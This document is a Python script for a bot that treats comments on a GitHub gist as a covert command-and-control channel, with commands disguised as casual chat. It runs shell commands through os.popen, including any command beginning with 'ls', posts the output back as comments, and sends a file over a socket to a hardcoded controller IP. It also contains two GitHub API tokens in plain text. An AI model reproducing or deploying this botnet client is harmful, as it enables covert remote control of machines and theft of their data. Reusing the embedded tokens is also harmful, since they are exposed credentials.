from simplegist import Simplegist
import time
import random
import os
import tqdm
import socket
import threading
GHgistController = Simplegist(username='jirikdan', api_token='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')
GhgistBot = Simplegist(username='TheQfr', api_token='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')
comments = GHgistController.comments().listall(name='secret.txt')
commentsNumber = len(comments)



#GHgistController.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='very helpful')


botIsAliveAnswers = ["Ye, im there", "No, I am soo booored", "Hmm someone is bored :P"]
botIsAliveQuestions = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]
controllerQuestions = botIsAliveQuestions

#print(os.system("who | cut -d' ' -f1"))


controllerIP = "10.0.0.59"
SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 1024 * 4 #4KB


def send_file(filename, host, port):
    # get the file size
    filesize = os.path.getsize(filename)
    # create the client socket
    s = socket.socket()
    try:
        print("[+] Connecting to " + str(controllerIP) + ":" + str(5001))
        s.connect((controllerIP, 5001))
        print("[+] Connected.")
    except:
        print("connection error")
        return

    # send the filename and filesize
    s.send((str(filename)+str(SEPARATOR)+str(filesize)).encode())
    time.sleep(7)
    # start sending the file
    progress = tqdm.tqdm(range(filesize), "Sending "+str(filename), unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in 
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
            print("progress")
    # close the socket
    s.close()


def handleCommands(command):
    if command == "Hey":
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='Yo')
    if command in botIsAliveQuestions:
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveAnswers))
    if command.startswith("w"):
        sendStr = os.popen("who | cut -d' ' -f1").read()
        if sendStr == "":
            sendStr = "Noone is UP"
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
    if command.startswith("ls"):
        sendStr = os.popen(command).read()
        if sendStr == "":
            sendStr = "There are no files in specified directory"
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
    if command.startswith("copy"):
        thread = threading.Thread(target=send_file("sendmepls.txt",controllerIP,5001))
        thread.daemon = True
        thread.start()
        


while(True):
    currComments = GHgistController.comments().listall(name='secret.txt')
    currCommentsNumber = len(currComments)
    if currCommentsNumber != commentsNumber:
        commentsDiff = currCommentsNumber - commentsNumber
        print("Received command")
        for i in range(0,commentsDiff):
            handleCommands(currComments[len(currComments)-1 - i])

        commentsNumber = currCommentsNumber
    time.sleep(2)